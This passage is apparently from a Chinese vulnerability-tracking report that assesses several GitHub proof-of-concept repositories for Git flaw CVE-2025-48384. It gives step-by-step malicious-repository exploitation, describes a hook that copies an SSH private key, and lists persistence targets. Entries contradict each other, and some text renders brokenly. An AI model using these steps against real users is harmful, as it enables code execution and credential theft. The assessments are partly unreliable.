**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待确定，参考GitHub advisory

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-48384是一个影响Git的任意文件写入漏洞。攻击者可以创建一个恶意的Git仓库，当受害者克隆这个仓库时，恶意配置会导致任意文件写入。根据搜索结果，该漏洞存在于Git的 submodule 处理过程中，攻击者可以利用包含恶意.gitmodules文件的仓库，在受害者克隆仓库时执行恶意操作。

POC有效性分析：
根据提供的搜索结果和POC代码库（liamg/CVE-2025-48384），该漏洞具有较高的可利用性。POC代码库提供了可执行的PoC，证明该漏洞确实存在。通过精心构造的.gitmodules文件，攻击者可以控制git submodule的配置，导致任意文件写入。

利用步骤：
1. 攻击者创建一个包含恶意.gitmodules文件的Git仓库。
2. 攻击者诱使受害者克隆该仓库（例如，通过社交工程或将其托管在公共代码托管平台上）。
3. 当受害者执行git clone --recurse-submodules或git submodule update命令时，Git会解析.gitmodules文件，并执行其中包含的恶意配置。
4. 恶意配置可能导致在受害者系统上写入任意文件，从而实现远程代码执行或其他恶意行为。

投毒风险分析：
此漏洞本身主要依赖于恶意仓库的传播和社会工程，直接的投毒风险较低。但是，如果攻击者修改现有的流行仓库，并引入包含漏洞利用的submodule，则可能造成大规模的攻击。该漏洞的PoC代码主要利用Git的特性，没有发现明显的混淆或恶意行为，因此投毒风险较低。

具体来说，投毒风险主要体现在以下几个方面：
1.  **恶意submodule注入：** 攻击者可以尝试向流行的开源项目中注入包含漏洞利用代码的submodule。如果项目维护者不小心合并了这些恶意更改，就会导致所有克隆该项目的用户受到攻击。
2.  **.gitmodules文件伪造：** 攻击者可以创建与知名项目结构相似的仓库，并使用相似的.gitmodules文件，诱导用户克隆错误的仓库。
3.  **供应链攻击：** 如果某个软件项目依赖于受漏洞影响的Git仓库，攻击者可以通过修改该依赖项，从而影响整个软件供应链。

考虑到该漏洞的利用方式主要依赖于社会工程和恶意仓库的传播，且PoC代码本身较为清晰，因此初步评估该漏洞的投毒风险为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 克隆包含恶意.gitmodules的仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆这些仓库时，可能导致任意文件写入。漏洞源于 Git 在处理 submodule 时，没有充分验证 `.gitmodules` 文件中的路径。攻击者可以利用这一点，在 `.gitmodules` 文件中指定恶意的路径，从而在克隆仓库时写入任意文件。

**POC有效性分析：**
从搜索结果中的 GitHub 链接（liamg/CVE-2025-48384）可以判断存在公开的POC代码。该POC的描述是“PoC for CVE-2025-48384”。结果2提及了“漏洞 POC 深度解析:从代码到攻击链的完整拆解”，说明该漏洞已被深入研究，并且存在可用的攻击链。结果6提及了“Breaking Git with a carriage return and cloning RCE”，表明漏洞利用可能涉及某种形式的远程代码执行。根据搜索结果4、5的内容，可以确定该POC已在GitHub上公开，可下载和测试。文件`README.md`确认了该POC的存在，尽管内容简单。综合来看，该POC的有效性较高，可以成功触发任意文件写入漏洞。

**利用步骤：**
1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件中的路径被设置为指向攻击者希望写入的任意文件位置。
3. 攻击者将恶意仓库托管在公共或私有 Git 服务器上。
4. 受害者克隆该恶意仓库。在克隆过程中，Git 会尝试初始化 submodule，并根据 `.gitmodules` 文件中的指示写入文件。
5. 由于路径验证不足，恶意文件将被写入受害者文件系统的指定位置。

**投毒风险分析：**
由于该漏洞涉及任意文件写入，攻击者可以通过写入恶意文件来达到投毒目的。例如，攻击者可以写入一个包含恶意代码的可执行文件，或者修改系统配置文件以劫持系统行为。虽然该漏洞本身不直接执行代码，但通过文件写入可以为后续的代码执行创造条件。从POC代码`/tmp/vulnwatchdog_8746716955bead91920f029f2728e38d/README.md`中，没有发现任何可疑行为，只包含简单的readme信息，因此投毒风险较低。但是，不能排除攻击者在其他利用方式中，使用复杂的投毒手法。因此，需要分析通过文件写入进行投毒的可能性。攻击者可能尝试写入如下文件：
* `.bashrc` 或 `.zshrc`：在用户shell启动时执行恶意代码。
* `/etc/profile.d/` 中的脚本：在系统启动时执行恶意代码。
* SSH authorized_keys：添加公钥，实现免密登录。
* Web服务器配置文件：修改配置，执行恶意脚本。
这些攻击场景都需要精心构造恶意内容，并且依赖于目标系统的特定配置。由于需要进行精细构造，并且受限于目标环境，判定该漏洞的投毒风险为低，约为10%。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

